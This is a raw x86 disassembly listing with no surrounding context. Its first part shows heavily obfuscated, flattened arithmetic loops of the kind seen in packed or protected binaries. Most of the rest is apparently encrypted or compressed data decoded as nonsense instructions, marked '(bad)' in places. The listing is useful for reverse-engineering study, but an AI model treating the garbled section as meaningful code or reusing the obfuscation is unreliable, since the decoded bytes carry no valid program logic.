  41d6d3:	mov    edx,DWORD PTR [ebp+0x8]
  41d6d6:	mov    ebx,0xfa5e1521
  41d6db:	sub    ebx,edx
  41d6dd:	add    ebx,DWORD PTR [ebp-0x44]
  41d6e0:	mov    DWORD PTR [ebp-0x44],ebx
  41d6e3:	mov    edx,DWORD PTR [ebp+0x8]
  41d6e6:	xor    edx,eax
  41d6e8:	add    edx,esi
  41d6ea:	jne    0x41b310
  41d6f0:	mov    edx,DWORD PTR [ebp-0x14]
  41d6f3:	mov    DWORD PTR [ebp+0x8],edx
  41d6f6:	jmp    0x41d76b
  41d6fb:	mov    edx,DWORD PTR [ebp+0x8]
  41d6fe:	mov    ebx,DWORD PTR [ebp-0x8]
  41d701:	xor    edx,eax
  41d703:	xor    ebx,eax
  41d705:	sub    edx,ebx
  41d707:	sub    edx,esi
  41d709:	xor    edx,eax
  41d70b:	mov    DWORD PTR [ebp+0x8],edx
  41d70e:	mov    edx,DWORD PTR [ebp+0x8]
  41d711:	mov    ebx,DWORD PTR [ebp-0x58]
  41d714:	add    edx,0x5708f1
  41d71a:	imul   edx,ebx
  41d71d:	mov    DWORD PTR [ebp-0x58],edx
  41d720:	mov    edx,DWORD PTR [ebp+0x8]
  41d723:	mov    ebx,DWORD PTR [ebp-0x54]
  41d726:	add    edx,0x64f893
  41d72c:	or     edx,ebx
  41d72e:	mov    DWORD PTR [ebp-0x54],edx
  41d731:	mov    edx,DWORD PTR [ebp+0x8]
  41d734:	mov    ebx,DWORD PTR [ebp-0x50]
  41d737:	add    edx,ecx
  41d739:	xor    edx,ebx
  41d73b:	mov    DWORD PTR [ebp-0x50],edx
  41d73e:	mov    edx,DWORD PTR [ebp+0x8]
  41d741:	mov    ebx,DWORD PTR [ebp-0x4c]
  41d744:	add    edx,edi
  41d746:	and    edx,ebx
  41d748:	mov    DWORD PTR [ebp-0x4c],edx
  41d74b:	mov    edx,DWORD PTR [ebp+0x8]
  41d74e:	mov    ebx,DWORD PTR [ebp-0x48]
  41d751:	lea    edx,[ebx+edx*1+0x241fcde]
  41d758:	mov    DWORD PTR [ebp-0x48],edx
  41d75b:	mov    edx,DWORD PTR [ebp+0x8]
  41d75e:	mov    ebx,0xfa5e1521
  41d763:	sub    ebx,edx
  41d765:	add    ebx,DWORD PTR [ebp-0x44]
  41d768:	mov    DWORD PTR [ebp-0x44],ebx
  41d76b:	mov    edx,DWORD PTR [ebp+0x8]
  41d76e:	xor    edx,eax
  41d770:	add    edx,esi
  41d772:	jne    0x41d6fb
  41d778:	mov    edx,DWORD PTR [ebp-0x8]
  41d77b:	mov    ebx,DWORD PTR [ebp-0xc]
  41d77e:	xor    edx,eax
  41d780:	lea    edx,[edx+ebx*1+0x3272ec]
  41d787:	mov    DWORD PTR [ebp-0xc],edx
  41d78a:	mov    edx,DWORD PTR [ebp-0x10]
  41d78d:	xor    edx,eax
  41d78f:	add    edx,esi
  41d791:	jne    0x418ba5
  41d797:	jmp    0x421f74
  41d79c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d79f:	mov    DWORD PTR [ebp+0x8],ecx
  41d7a2:	jmp    0x41d81b
  41d7a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7aa:	mov    edx,DWORD PTR [ebp-0x8]
  41d7ad:	xor    ecx,eax
  41d7af:	xor    edx,eax
  41d7b1:	sub    ecx,edx
  41d7b3:	sub    ecx,esi
  41d7b5:	xor    ecx,eax
  41d7b7:	mov    DWORD PTR [ebp+0x8],ecx
  41d7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7bd:	mov    edx,DWORD PTR [ebp-0x58]
  41d7c0:	add    ecx,0x5708f1
  41d7c6:	imul   ecx,edx
  41d7c9:	mov    DWORD PTR [ebp-0x58],ecx
  41d7cc:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7cf:	mov    edx,DWORD PTR [ebp-0x54]
  41d7d2:	add    ecx,0x64f893
  41d7d8:	or     ecx,edx
  41d7da:	mov    DWORD PTR [ebp-0x54],ecx
  41d7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7e0:	mov    edx,DWORD PTR [ebp-0x50]
  41d7e3:	add    ecx,0x242ebcc
  41d7e9:	xor    ecx,edx
  41d7eb:	mov    DWORD PTR [ebp-0x50],ecx
  41d7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7f1:	mov    edx,DWORD PTR [ebp-0x4c]
  41d7f4:	add    ecx,edi
  41d7f6:	and    ecx,edx
  41d7f8:	mov    DWORD PTR [ebp-0x4c],ecx
  41d7fb:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7fe:	mov    edx,DWORD PTR [ebp-0x48]
  41d801:	lea    ecx,[edx+ecx*1+0x241fcde]
  41d808:	mov    DWORD PTR [ebp-0x48],ecx
  41d80b:	mov    ecx,DWORD PTR [ebp+0x8]
  41d80e:	mov    edx,0xfa5e1521
  41d813:	sub    edx,ecx
  41d815:	add    edx,DWORD PTR [ebp-0x44]
  41d818:	mov    DWORD PTR [ebp-0x44],edx
  41d81b:	mov    ecx,DWORD PTR [ebp+0x8]
  41d81e:	xor    ecx,eax
  41d820:	add    ecx,esi
  41d822:	jne    0x41d7a7
  41d828:	jmp    0x421f80
  41d82d:	mov    ecx,DWORD PTR [ebp+0x8]
  41d830:	mov    edx,DWORD PTR [ebp-0x8]
  41d833:	xor    ecx,eax
  41d835:	xor    edx,eax
  41d837:	sub    ecx,edx
  41d839:	sub    ecx,esi
  41d83b:	xor    ecx,eax
  41d83d:	mov    DWORD PTR [ebp+0x8],ecx
  41d840:	mov    ecx,DWORD PTR [ebp+0x8]
  41d843:	mov    edx,DWORD PTR [ebp-0x58]
  41d846:	add    ecx,0x5708f1
  41d84c:	imul   ecx,edx
  41d84f:	mov    DWORD PTR [ebp-0x58],ecx
  41d852:	mov    ecx,DWORD PTR [ebp+0x8]
  41d855:	mov    edx,DWORD PTR [ebp-0x54]
  41d858:	jmp    0x41fbbb
  41d85d:	bound  ecx,QWORD PTR [ebp+0x70]
  41d860:	push   0x43623b4b
  41d865:	fsub   QWORD PTR [ecx]
  41d867:	xchg   BYTE PTR [edi-0x51],ah
  41d86a:	jmp    0x41d854
  41d86c:	repnz (bad) 
  41d86e:	sar    DWORD PTR [ebp+0x7a],cl
  41d871:	xor    BYTE PTR [edi+0x7a],bl
  41d874:	jp     0x41d8af
  41d876:	add    BYTE PTR [ecx+0x393bf7aa],dh
  41d87c:	into   
  41d87d:	popf   
  41d87e:	out    dx,eax
  41d87f:	sbb    DWORD PTR [ebx*8+0x328f8a8b],esp
  41d886:	aad    0xfc
  41d888:	adc    DWORD PTR [edx-0x5d],eax
  41d88b:	jge    0x41d8f3
  41d88d:	and    eax,0xcc3ce4f2
  41d892:	imul   esp,DWORD PTR [esi-0x7b],0x43c0cf
  41d899:	dec    esp
  41d89a:	call   0x27b985a8
  41d89f:	push   ebp
  41d8a0:	sbb    eax,0xdd83112
  41d8a5:	imul   esp,DWORD PTR [ebp+eax*8-0x55cda7af],0x4a
  41d8ad:	adc    dh,bh
  41d8af:	int3   
  41d8b0:	in     eax,dx
  41d8b1:	or     BYTE PTR [eax+0x9],0xf7
  41d8b5:	mov    eax,0xfd68f5f9
  41d8ba:	mov    al,0xf8
  41d8bc:	pop    esp
  41d8bd:	mov    ds:0x5021c1d7,al
  41d8c2:	xor    esi,DWORD PTR [edx+0x79]
  41d8c5:	pop    ss
  41d8c6:	aaa    
  41d8c7:	mov    dh,0x9a
  41d8c9:	ja     0x41d938
  41d8cb:	inc    eax
  41d8cc:	mov    eax,0x8cf40f60
  41d8d1:	dec    ebp
  41d8d2:	jle    0x41d860
  41d8d4:	mov    dl,0x64
  41d8d6:	mov    bh,0xdc
  41d8d8:	sbb    DWORD PTR [eax-0x78],eax
  41d8db:	dec    esi
  41d8dc:	sub    eax,0xb38fd9e2
  41d8e1:	test   eax,0x8a401587
  41d8e6:	or     DWORD PTR [ebx-0x25bfcd01],0x1d9f6eb6
  41d8f0:	lahf   
  41d8f1:	call   0x2448:0x304d11c1
  41d8f8:	sbb    bh,BYTE PTR [esi]
  41d8fa:	sbb    eax,0x152849fb
  41d8ff:	sub    ah,BYTE PTR [ecx]
  41d901:	and    ebp,DWORD PTR [ebp-0x68]
  41d904:	sbb    eax,0xaff3c034
  41d909:	pop    es
  41d90a:	add    BYTE PTR [eax+0xf],0xc2
  41d90e:	shrd   DWORD PTR [ecx-0x4a83ef7c],ebx,0x2b
  41d916:	test   eax,0x970ce155
  41d91b:	inc    ebp
  41d91c:	lea    eax,[edi-0x3b]
  41d91f:	push   ebx
  41d920:	push   esp
  41d921:	hlt    
  41d922:	or     al,0x43
  41d924:	fwait
  41d925:	or     DWORD PTR [esi],esi
  41d927:	cli    
  41d928:	cmp    cl,ch
  41d92a:	mov    edi,0x156f487e
  41d92f:	sub    edx,DWORD PTR [eax]
  41d931:	push   ecx
  41d932:	jo     0x41d92f
  41d934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d935:	popf   
  41d936:	inc    esi
  41d937:	pushf  
  41d938:	jmp    0x41d95f
  41d93a:	shl    BYTE PTR [ebp+ebx*4-0x16565791],0xe3
  41d942:	stos   BYTE PTR es:[edi],al
  41d943:	(bad)
  41d94b:	push   DWORD PTR [ebx+edx*2+0xc3cc237]
  41d952:	and    bh,0x83
  41d955:	jno    0x41d935
  41d957:	fnstenv [ebx+0x1633c450]
  41d95d:	xlat   BYTE PTR ds:[ebx]
  41d95e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d95f:	adc    eax,0xc50797b7
  41d964:	cs cs inc edx
  41d967:	push   es
  41d968:	jne    0x41d9c7
  41d96a:	(bad)  
  41d96b:	mov    WORD PTR [edx-0x7b7368da],?
  41d971:	in     eax,0x6c
  41d973:	and    BYTE PTR cs:[edx-0x218df253],ah
  41d97a:	out    0xbe,al
  41d97c:	das    
  41d97d:	pop    esp
  41d97e:	dec    edx
  41d97f:	mov    edx,0x3b789116
  41d984:	push   ecx
  41d985:	enter  0x363,0x5d
  41d989:	adc    dh,bh
  41d98b:	and    cl,BYTE PTR [ebx]
  41d98d:	inc    edx
  41d98e:	daa    
  41d98f:	in     eax,0xd8
  41d991:	dec    ebx
  41d992:	aaa    
  41d993:	in     eax,dx
  41d994:	or     al,0x7d
  41d996:	mov    ah,0xa4
  41d998:	jbe    0x41d9c2
  41d99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d99b:	jg     0x41d977
  41d99d:	lods   eax,DWORD PTR ds:[esi]
  41d99e:	xchg   DWORD PTR [eax+0x1d1d44f0],eax
  41d9a4:	push   es
  41d9a5:	in     al,dx
  41d9a6:	sbb    eax,0xbc763513
  41d9ab:	pop    ebx
  41d9ac:	jg     0x41d942
  41d9ae:	js     0x41da0c
  41d9b0:	aam    0xf4
  41d9b2:	jo     0x41d9a5
  41d9b4:	ins    BYTE PTR es:[edi],dx
  41d9b5:	(bad)
  41d9b8:	cdq    
  41d9b9:	jo     0x41da05
  41d9bb:	add    ebp,DWORD PTR [edi-0x34]
  41d9be:	out    0xe4,al
  41d9c0:	cld    
  41d9c1:	sti    
  41d9c2:	cmp    BYTE PTR [esi+0x1076e12a],dh
  41d9c8:	fs (bad) 
  41d9ca:	fistp  WORD PTR [esp+edx*4]
  41d9cd:	add    ah,BYTE PTR [esi-0x217466c8]
  41d9d3:	add    bl,dh
  41d9d5:	mov    esp,0x136193b0
  41d9da:	rol    BYTE PTR [esi-0x72],cl
  41d9dd:	sbb    eax,0x7d73975
  41d9e2:	outs   dx,BYTE PTR ds:[esi]
  41d9e3:	rol    DWORD PTR [eax-0x3a8d810f],1
  41d9e9:	in     eax,0xd6
  41d9eb:	jp     0x41d9a4
  41d9ed:	xor    DWORD PTR [eax],ecx
  41d9ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9f0:	push   ecx
  41d9f1:	push   cs
  41d9f2:	or     ebp,ecx
  41d9f4:	dec    eax
  41d9f5:	push   esp
  41d9f6:	test   BYTE PTR [ebx-0x14],ch
  41d9f9:	push   0xffffff89
  41d9fb:	push   es
  41d9fc:	sub    DWORD PTR [ebx+0x6e],ebx
  41d9ff:	mov    ecx,0xf80129c9
  41da04:	and    al,0xfe
  41da06:	scas   al,BYTE PTR es:[edi]
  41da07:	inc    ecx
  41da08:	push   es
  41da09:	cs gs jns 0x41d9bd
  41da0d:	pop    ebp
  41da0e:	sbb    DWORD PTR [edi],esi
  41da10:	jp     0x41da8a
  41da12:	dec    edi
  41da13:	fcomp  st(7)
  41da15:	popa   
  41da16:	pop    edx
  41da17:	cmp    BYTE PTR [edi],al
  41da19:	dec    edi
  41da1a:	fwait
  41da1b:	mov    dl,0x34
  41da1d:	js     0x41da37
  41da1f:	xchg   edi,eax
  41da20:	and    eax,0x388cfcb5
  41da25:	jmp    0xb79d:0x4525ec51
  41da2c:	sbb    dh,BYTE PTR ds:0x9a910b5d
  41da32:	rcr    DWORD PTR [edx+0x2ccf73f6],0xa5
  41da39:	hlt    
  41da3a:	xchg   DWORD PTR [edi],ecx
  41da3c:	sub    edx,DWORD PTR [edi-0x50]
  41da3f:	(bad)  
  41da40:	imul   ecx,DWORD PTR [esi],0x660b22c6
  41da46:	push   cs
  41da47:	data16 sahf 
  41da49:	or     eax,0x1dbdff15
  41da4e:	mov    ch,0x71
  41da50:	(bad)  
  41da51:	adc    edi,DWORD PTR [esp+eax*2]
  41da54:	and    bl,BYTE PTR [ecx-0x2e]
  41da57:	xchg   ebp,eax
  41da58:	scas   al,BYTE PTR es:[edi]
  41da59:	shl    DWORD PTR [eax+0xf],cl
  41da5c:	cmp    al,0xa8
  41da5e:	jmp    0xc727:0x35098b6a
  41da65:	xor    esp,DWORD PTR [ecx+0x5d]
  41da68:	sub    DWORD PTR [edi+0x14c6d63],eax
  41da6e:	repz dec esp
  41da70:	lods   al,BYTE PTR ds:[esi]
  41da71:	loop   0x41da11
  41da73:	int    0xb6
  41da75:	pop    ds
  41da76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da77:	adc    edx,DWORD PTR [ebx-0x40]
  41da7a:	xor    esi,DWORD PTR ds:0xb5b7044
  41da80:	ror    DWORD PTR [ebx+0x43],cl
  41da83:	icebp  
  41da84:	mov    gs,WORD PTR [ecx+0x47e354c3]
  41da8a:	jne    0x41da91
  41da8c:	mov    ebp,0xb47af30
  41da91:	stos   BYTE PTR es:[edi],al
  41da92:	xor    al,0xc3
  41da94:	jno    0x41dac2
  41da96:	pop    eax
  41da97:	xchg   ebp,eax
  41da98:	int    0x6a
  41da9a:	or     DWORD PTR [eax-0xb94e999],esp
  41daa0:	and    bh,BYTE PTR [eax-0x79dfdd5f]
  41daa6:	jne    0x41da2d
  41daa8:	shl    BYTE PTR [ebx+0x5d],0x5
  41daac:	lds    ebp,FWORD PTR [ecx]
  41daae:	dec    ebx
  41daaf:	fst    QWORD PTR [ebx-0xf]
  41dab2:	mov    DWORD PTR [edx+ecx*4+0x10],0xdb7de975
  41daba:	xchg   edi,eax
  41dabb:	mov    al,ds:0x9517135f
  41dac0:	mov    ah,0x6f
  41dac2:	push   esi
  41dac3:	mov    bh,0x6b
  41dac5:	sbb    al,0x5b
  41dac7:	popa   
  41dac8:	loope  0x41da96
  41daca:	mov    ds:0xbd6d654,eax
  41dacf:	mov    al,0xfe
  41dad1:	adc    eax,0xe2fe8339
  41dad6:	mov    cl,0x81
  41dad8:	inc    esp
  41dad9:	mov    cl,bl
  41dadb:	push   ecx
  41dadc:	scas   al,BYTE PTR es:[edi]
  41dadd:	sti    
  41dade:	loop   0x41db4a
  41dae0:	pop    esi
  41dae1:	cmp    al,0xa
  41dae3:	dec    edi
  41dae4:	jmp    0x41db5f
  41dae6:	cdq    
  41dae7:	push   edi
  41dae8:	test   eax,0x7d1597f8
  41daed:	mov    ebp,0x6de7c30c
  41daf2:	push   ds
  41daf3:	or     bh,cl
  41daf5:	jmp    0x24d9:0xb759a00f
  41dafc:	fbstp  TBYTE PTR [edx+0x6a8a17ab]
  41db02:	stc    
  41db03:	jae    0x41db6d
  41db05:	or     ebx,DWORD PTR [edi-0x4b]
  41db08:	and    DWORD PTR [ebp+0x69],ebx
  41db0b:	jno    0x41dac6
  41db0d:	dec    eax
  41db0e:	inc    ebx
  41db0f:	mov    ebx,0x2ad182bf
  41db14:	push   esp
  41db15:	lods   al,BYTE PTR ds:[esi]
  41db16:	jo     0x41db8b
  41db18:	pop    ecx
  41db19:	mov    BYTE PTR [ebx],ch
  41db1b:	out    0x86,eax
  41db1d:	jl     0x41db45
  41db1f:	push   0xfd1810f0
  41db24:	bound  esp,QWORD PTR [ebx+0xe]
  41db27:	inc    dh
  41db29:	mov    ah,0xfc
  41db2b:	fdivp  st(1),st
  41db2d:	dec    edx
  41db2e:	jns    0x41db28
  41db30:	sub    DWORD PTR [eax+eiz*1],0x19
  41db34:	or     eax,DWORD PTR [edi-0x7f]
  41db37:	jnp    0x41db13
  41db39:	hlt    
  41db3a:	jne    0x41dae2
  41db3c:	pop    gs
  41db3e:	pop    ecx
  41db3f:	in     al,dx
  41db40:	fidiv  WORD PTR [edx+0x58]
  41db43:	inc    eax
  41db44:	ds pusha 
  41db46:	or     eax,0xb43494b5
  41db4b:	dec    esp
  41db4c:	push   edi
  41db4d:	(bad)  
  41db4e:	dec    eax
  41db4f:	das    
  41db50:	cs ret 0xb10f
  41db54:	cld    
  41db55:	(bad)  
  41db56:	lock sub al,0x6b
  41db59:	fsub   DWORD PTR [ebp-0xc]
  41db5c:	jo     0x41db56
  41db5e:	loop   0x41dae8
  41db60:	and    eax,0xfb19e8d7
  41db65:	not    DWORD PTR [ebp-0x7193592c]
  41db6b:	cs jnp 0x41db8a
  41db6e:	call   0xed5d880b
  41db73:	inc    ecx
  41db74:	mov    edx,0x48dc4253
  41db79:	xlat   BYTE PTR ds:[ebx]
  41db7a:	dec    ebp
  41db7b:	add    dh,BYTE PTR [edi]
  41db7d:	sbb    ebp,DWORD PTR [esi+eax*2]
  41db80:	and    cl,cl
  41db82:	pop    edi
  41db83:	out    dx,al
  41db84:	pop    ds
  41db85:	ins    BYTE PTR es:[edi],dx
  41db86:	popa   
  41db87:	push   eax
  41db88:	fs cs pop ecx
  41db8b:	(bad)  
  41db8c:	rcr    BYTE PTR ds:0x9b7c3756,0xa9
  41db93:	test   eax,0xc40afb00
  41db98:	dec    ebp
  41db99:	fwait
  41db9a:	call   0x2ac4:0x766d8203
  41dba1:	call   0x1b7d:0x5a25646b
  41dba8:	xor    edx,edi
  41dbaa:	stos   DWORD PTR es:[edi],eax
  41dbab:	daa    
  41dbac:	js     0x41dbda
  41dbae:	mov    eax,DWORD PTR [esi-0x41]
  41dbb1:	push   0xffffffde
  41dbb3:	int3   
  41dbb4:	inc    ecx
  41dbb5:	add    BYTE PTR [esi+esi*2],ch
  41dbb8:	(bad)  
  41dbb9:	ror    ch,cl
  41dbbb:	pop    ebp
  41dbbc:	or     eax,0x6248abab
  41dbc1:	mov    ebp,0xce3cdb2a
  41dbc6:	adc    dh,BYTE PTR [ebx]
  41dbc8:	sbb    ecx,DWORD PTR [edi+0x6efcc17f]
  41dbce:	(bad)  
  41dbcf:	int3   
  41dbd0:	aad    0x6e
  41dbd2:	sub    al,BYTE PTR [eax-0x7c]
  41dbd5:	dec    ebx
  41dbd6:	outs   dx,BYTE PTR ds:[esi]
  41dbd7:	xchg   ebp,eax
  41dbd8:	xchg   esi,eax
  41dbd9:	push   cs
  41dbda:	cmc    
  41dbdb:	inc    edx
  41dbdc:	add    al,0xe7
  41dbde:	and    BYTE PTR [ecx-0x18],ah
  41dbe1:	and    DWORD PTR [esi-0x4cb62623],esi
  41dbe7:	cli    
  41dbe8:	aam    0x38
  41dbea:	add    BYTE PTR [edx+ebx*4+0x5c],0xe2
  41dbef:	lds    esi,FWORD PTR [esi]
  41dbf1:	mul    DWORD PTR [esi]
  41dbf3:	push   0xc62db262
  41dbf8:	jle    0x41dc3d
  41dbfa:	push   ebx
  41dbfb:	cli    
  41dbfc:	xchg   edi,eax
  41dbfd:	jns    0x41dc4c
  41dbff:	or     al,0x88
  41dc01:	xchg   esp,eax
  41dc02:	aaa    
  41dc03:	imul   bl
  41dc05:	fsub   DWORD PTR [ebp+0x68]
  41dc08:	imul   esp,DWORD PTR [eax+0x5],0x255c79c8
  41dc0f:	add    eax,0x561a68c7
  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	retf   
  41dc16:	add    al,0xe3
  41dc18:	cli    
  41dc19:	inc    esp
  41dc1a:	or     dh,ah
  41dc1c:	loope  0x41dbcc
  41dc1e:	jge    0x41dbd6
  41dc20:	pop    ds
  41dc21:	mov    ch,0xf5
  41dc23:	or     eax,0x6ffda754
  41dc28:	sahf   
  41dc29:	cwde   
  41dc2a:	jl     0x41dbd5
  41dc2c:	mov    ebp,0x9321f53f
  41dc31:	and    DWORD PTR [edx-0x70],eax
  41dc34:	dec    esp
  41dc35:	retf   0xa1d4
  41dc38:	aam    0x64
  41dc3a:	jno    0x41dcb5
  41dc3c:	xchg   BYTE PTR [ecx+0x1f],dl
  41dc3f:	push   ss
  41dc40:	xor    al,0x19
  41dc42:	xor    BYTE PTR [ebx-0x238f466f],ch
  41dc48:	sub    dl,BYTE PTR [esi+0x47]
  41dc4b:	pop    es
  41dc4c:	in     al,0x6d
  41dc4e:	cli    
  41dc4f:	dec    ebp
  41dc50:	inc    esp
  41dc51:	ja     0x41dc77
  41dc53:	mov    ds,WORD PTR [edx]
  41dc55:	aam    0x5c
  41dc57:	jg     0x41dc00
  41dc59:	push   esi
  41dc5a:	mov    edx,0x3b32263
  41dc5f:	cmovs  edi,DWORD PTR [eax]
  41dc62:	jmp    0xacf64f42
  41dc67:	jbe    0x41dce3
  41dc69:	adc    BYTE PTR [ebx-0x54],bl
  41dc6c:	out    dx,al
  41dc6d:	(bad)  
  41dc6e:	mov    esp,0xe1c5db0b
  41dc73:	rcl    BYTE PTR [ebp+eax*2+0x3f59c6ec],1
  41dc7a:	aaa    
  41dc7b:	jmp    0x41dc76
  41dc7d:	fistp  DWORD PTR [ecx+0x531d35a]
  41dc83:	mov    DWORD PTR [eax],ecx
  41dc85:	adc    ch,BYTE PTR [ebx-0x34]
  41dc88:	and    BYTE PTR [ecx],0x4f
  41dc8b:	jp     0x41dca5
  41dc8d:	and    dh,BYTE PTR [esi+0x29bbbc32]
  41dc93:	sub    al,0xdd
  41dc95:	mov    ebp,0x45b84028
  41dc9a:	add    eax,esi
  41dc9c:	xchg   edx,eax
  41dc9d:	inc    esi
  41dc9e:	xchg   edx,eax
  41dc9f:	mov    dl,0x59
  41dca1:	dec    edi
  41dca2:	and    al,0x5e
  41dca4:	(bad)  
  41dca5:	cmp    dh,BYTE PTR [ebp+0x647f49a9]
  41dcab:	pop    ebp
  41dcac:	and    ah,BYTE PTR [edi+0x2c]
  41dcaf:	out    0x2c,al
  41dcb1:	or     bl,BYTE PTR [eax+0x7074f4eb]
  41dcb7:	adc    DWORD PTR [eax-0x60],ebx
  41dcba:	fcom   DWORD PTR [edi+0x2c]
  41dcbd:	test   BYTE PTR [ebx],dl
  41dcbf:	lds    esi,FWORD PTR [edx-0x42]
  41dcc2:	mov    ebx,0x74bc1bab
  41dcc7:	ror    DWORD PTR [edi-0x4ddc297a],0xe9
  41dcce:	cmp    ah,BYTE PTR [eax-0x60c9257c]
  41dcd4:	jp     0x41dc8e
  41dcd6:	and    eax,ecx
  41dcd8:	mov    edx,0x66f1da75
  41dcdd:	mov    dh,0x23
  41dcdf:	outs   dx,BYTE PTR ds:[esi]
  41dce0:	sbb    al,0xc9
  41dce2:	outs   dx,DWORD PTR ds:[esi]
  41dce3:	sar    DWORD PTR [ebp-0x4633792d],0x1d
  41dcea:	gs int 0x31
  41dced:	mov    dl,0x41
  41dcef:	or     eax,0x7e50bd0f
  41dcf4:	mov    dl,0x56
  41dcf6:	sub    cl,BYTE PTR [edi+0x696916]
  41dcfc:	data16 cmp ch,BYTE PTR [edi+0x35095aa5]
  41dd03:	ins    BYTE PTR es:[edi],dx
  41dd04:	pop    esp
  41dd05:	shl    esi,0xaf
  41dd08:	dec    ebp
  41dd09:	icebp  
  41dd0a:	mov    BYTE PTR [ebx+0x14],bh
  41dd0d:	iret   
  41dd0e:	std    
  41dd0f:	jl     0x41dd89
  41dd11:	ss mov esp,0xda8c4af5
  41dd17:	fistp  WORD PTR [esi-0x1d45a1a]
  41dd1d:	sub    BYTE PTR [ebp+0x5404d74f],dl
  41dd23:	cs mov esp,0xa86979d6
  41dd29:	add    eax,ebx
  41dd2b:	mov    ds:0x53bff764,eax
  41dd30:	outs   dx,DWORD PTR ds:[esi]
  41dd31:	out    dx,al
  41dd32:	repnz popf 
  41dd34:	cmp    DWORD PTR [edx-0x5d],ebx
  41dd37:	test   dl,0xa7
  41dd3a:	push   ebp
  41dd3b:	cmp    DWORD PTR [ecx],ebx
  41dd3d:	mov    DWORD PTR [edi-0x7b],edi
  41dd40:	and    esp,edx
  41dd42:	mov    ebp,0xdcbad6dc
  41dd47:	std    
  41dd48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd49:	xor    esi,DWORD PTR [ebx+0x2a995c8f]
  41dd4f:	les    edx,FWORD PTR [edi+0x7fa084ec]
  41dd55:	cmp    ebp,DWORD PTR [eax-0xa173929]
  41dd5b:	loope  0x41dd7a
  41dd5d:	mov    dh,0xd2
  41dd5f:	stos   BYTE PTR es:[edi],al
  41dd60:	neg    ebx
  41dd62:	and    BYTE PTR [ebp+0x39],dl
  41dd65:	mov    al,0xf4
  41dd67:	call   FWORD PTR [ecx-0x77]
  41dd6a:	stos   BYTE PTR es:[edi],al
  41dd6b:	dec    ecx
  41dd6c:	xchg   ebp,eax
  41dd6d:	xchg   esp,eax
  41dd6e:	push   esi
  41dd6f:	xor    eax,0xf5040cc3
  41dd74:	pop    ecx
  41dd75:	loopne 0x41ddd9
  41dd77:	mov    BYTE PTR [ebx+0x32],dh
  41dd7a:	xchg   ecx,eax
  41dd7b:	fcom   DWORD PTR [edx+0x3d]
  41dd7e:	ret    
  41dd7f:	push   ebx
  41dd80:	fwait
  41dd81:	add    DWORD PTR [ebx+ebx*2],ecx
  41dd84:	int    0x32
  41dd86:	int3   
  41dd87:	cmp    BYTE PTR [ecx],ah
  41dd89:	sbb    BYTE PTR [eax-0x172ba38c],ch
  41dd8f:	ins    BYTE PTR es:[edi],dx
  41dd90:	pop    es
  41dd91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd92:	push   0xffffff9b
  41dd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd95:	cli    
  41dd96:	sbb    eax,0xd30a72e5
  41dd9b:	hlt    
  41dd9c:	or     eax,0xa984ea96
  41dda1:	fstp   QWORD PTR [edi-0x6f]
  41dda4:	lods   al,BYTE PTR ds:[esi]
  41dda5:	and    DWORD PTR [edx+ebx*4],0x45
  41dda9:	out    0xa4,al
  41ddab:	mul    BYTE PTR [esi-0x78]
  41ddae:	test   DWORD PTR [ecx],ebx
  41ddb0:	test   eax,0x11b66b9a
  41ddb5:	add    BYTE PTR [ecx+0x5116f28d],0xcb
  41ddbc:	add    DWORD PTR [edx+0x67],edx
  41ddbf:	dec    eax
  41ddc0:	mov    edx,es
  41ddc2:	repnz xor eax,0xb0dde63c
  41ddc8:	or     al,0x91
  41ddca:	fisttp WORD PTR [eax+eiz*1-0x5e]
  41ddce:	loopne 0x41ddee
  41ddd0:	mov    ah,0xf3
  41ddd2:	dec    ebx
  41ddd3:	inc    esp
  41ddd4:	scas   eax,DWORD PTR es:[edi]
  41ddd5:	sti    
  41ddd6:	sar    DWORD PTR [eax],cl
  41ddd8:	fistp  QWORD PTR [ecx]
  41ddda:	scas   al,BYTE PTR es:[edi]
  41dddb:	outs   dx,BYTE PTR ds:[esi]
  41dddc:	mov    edx,0xc98a752c
  41dde1:	jae    0x41dd93
  41dde3:	push   eax
  41dde4:	mov    ds:0xb4fe3ccb,al
  41dde9:	sub    BYTE PTR [edx-0x4d],dh
  41ddec:	sbb    al,0xa9
  41ddee:	xor    eax,0x7943efd0
  41ddf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddf4:	jle    0x41dda0
  41ddf6:	call   0x2032b858
  41ddfb:	or     DWORD PTR [ecx+eax*2-0x29c5e96b],edi
  41de02:	jne    0x41ddd2
  41de04:	sub    BYTE PTR [eax-0x1b59b623],al
  41de0a:	sbb    BYTE PTR [esi+ebx*1],dh
  41de0d:	scas   al,BYTE PTR es:[edi]
  41de0e:	retf   0x4489
  41de11:	data16 jmp 0x41ddc8
  41de14:	cwde   
  41de15:	fstp   st(2)
  41de17:	shl    ah,cl
  41de19:	fcmovb st,st(2)
  41de1b:	push   ecx
  41de1c:	stc    
  41de1d:	loope  0x41de6b
  41de1f:	push   edi
  41de20:	mov    WORD PTR [ebx+0x5],es
  41de23:	or     edx,DWORD PTR [ebp+0x16]
  41de26:	jmp    0x4ade45ab
  41de2b:	cmp    DWORD PTR [ebx],0x11
  41de2e:	dec    ebx
  41de2f:	xchg   edx,eax
  41de30:	mov    ah,0x29
  41de32:	fcom   DWORD PTR [esi-0x6b]
  41de35:	pusha  
  41de36:	push   esp
  41de37:	div    BYTE PTR [edi-0x80]
  41de3a:	mov    eax,ds:0x960e64a7
  41de3f:	mov    ebx,DWORD PTR [ebx+0x21594b55]
  41de45:	add    ch,BYTE PTR [ebx+0x19]
  41de48:	out    dx,al
  41de49:	or     DWORD PTR [eax],ebp
  41de4b:	and    al,0xde
  41de4d:	out    dx,eax
